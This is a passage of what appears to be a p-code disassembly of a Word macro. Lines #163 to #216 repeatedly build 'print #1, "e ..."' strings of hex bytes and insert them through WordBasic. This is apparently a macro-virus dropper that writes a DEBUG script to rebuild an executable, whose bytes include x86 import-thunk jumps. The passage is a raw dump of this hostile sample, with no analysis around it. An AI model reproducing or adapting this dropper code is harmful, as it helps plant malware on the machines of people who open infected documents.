' 	Add 
' 	LitStr 0x0037 "e 0ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #163:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #164:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #165:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #166:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #167:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #168:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #169:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #170:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #171:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #172:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #173:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b70 00 00 00 00 00 00 00 00 ff 25 7c 30 40 00 ff 25 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #174:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b80 80 30 40 00 ff 25 84 30 40 00 ff 25 88 30 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #175:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b90 ff 25 8c 30 40 00 ff 25 90 30 40 00 ff 25 94 30 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #176:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ba0 40 00 ff 25 98 30 40 00 ff 25 9c 30 40 00 ff 25 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #177:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bb0 a0 30 40 00 ff 25 a4 30 40 00 ff 25 a8 30 40 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #178:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bc0 ff 25 b0 30 40 00 ff 25 b4 30 40 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #179:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #180:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #181:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #182:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #183:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #184:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #185:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #186:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #187:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #188:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #189:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #190:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #191:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #192:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #193:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #194:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #195:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #196:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #197:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #198:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #199:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #200:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #201:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #202:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #203:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #204:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #205:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #206:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #207:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #208:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0da0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #209:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0db0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #210:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0dc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #211:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0dd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #212:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0de0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #213:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0df0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #214:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #215:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #216:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
